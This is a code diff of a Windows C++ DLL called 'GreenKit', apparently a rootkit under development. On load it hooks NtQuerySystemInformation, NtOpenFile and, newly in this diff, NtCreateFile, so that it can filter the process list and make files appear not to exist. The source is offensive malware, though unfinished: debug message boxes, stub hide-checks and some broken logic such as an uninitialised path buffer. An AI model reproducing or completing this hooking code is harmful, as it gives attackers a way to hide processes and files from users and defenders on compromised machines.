@@ -3,15 +3,6 @@
 
 #include "stdafx.h"
 #include "GreenKit.h"
-#include "process.h"
-#include <Windows.h>
-#include <string.h>
-#include <stdio.h>
-#include <winsock2.h>
-#include "ZwOpenFile.h"
-#include <string.h>
-#include <iostream>
-#include <winternl.h>
 
 BOOL mustHideFile(TCHAR filePath) {
     return FALSE; // TODO check la fin de la string avec des constantes
@@ -20,14 +11,6 @@ BOOL mustHideFile(TCHAR filePath) {
 BOOL mustHideReg(TCHAR filePath) {
     return TRUE; // TODO check la fin de la string avec des constantes
 }
-
-
-/*  IAT   HOOKING  */
-
-#pragma comment(lib, "ntdll")
-
-#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
-
 
 typedef struct _MY_SYSTEM_PROCESS_INFORMATION
 {
@@ -50,15 +33,7 @@ typedef NTSTATUS(WINAPI *PNT_QUERY_SYSTEM_INFORMATION)(
     __out_opt  PULONG ReturnLength
     );
 
-
-//useless
-PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation =
-(PNT_QUERY_SYSTEM_INFORMATION)::GetProcAddress(::GetModuleHandle("ntdll"), "NtQuerySystemInformation");
-
-
-LPVOID original_function;
-
-NTSTATUS NTAPI NewNtOpenFile(
+NTSTATUS WINAPI NewNtOpenFile(
     PHANDLE				phFile,
     ACCESS_MASK			DesiredAccess,
     POBJECT_ATTRIBUTES	ObjectAttributes,
@@ -67,11 +42,26 @@ NTSTATUS NTAPI NewNtOpenFile(
     ULONG				OpenOptions)
 {
     TCHAR sPath[MAX_PATH];
-    DWORD dwRet;
+    //DWORD dwRet;
     //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
-    MessageBox(0, "NTDLL HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
+    MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
     if (!mustHideFile(*sPath))
         NtOpenFile(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
+
+    return 3; // STATUS_NO_SUCH_FILE
+}
+
+NTSTATUS WINAPI NewNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
+    PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
+    ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)
+{
+    //TCHAR sPath[MAX_PATH];
+    //DWORD dwRet;
+    //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
+    MessageBox(0, "NTDLL CREATE HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
+    //if (!mustHideFile(*sPath))
+        NtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
+        CreateOptions, EaBuffer, EaLength);
 
     return 3; // STATUS_NO_SUCH_FILE
 }
@@ -87,7 +77,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
         SystemInformation,
         SystemInformationLength,
         ReturnLength);*/
-    MessageBox(0, "NTDLL HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
+    MessageBox(0, "NTDLL HOOOKED1", "HookTest", MB_OK | MB_ICONERROR);
     NTSTATUS status = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
     if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
     {
@@ -167,6 +157,7 @@ bool WINAPI DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
     case DLL_PROCESS_ATTACH:
         hook_function("NTDLL.DLL", "NtQuerySystemInformation", HookedNtQuerySystemInformation);
         hook_function("NTDLL.DLL", "NtOpenFile", NewNtOpenFile);
+        hook_function("NTDLL.DLL", "NtCreateFile", NewNtCreateFile);
         return TRUE;
     }
     return TRUE;
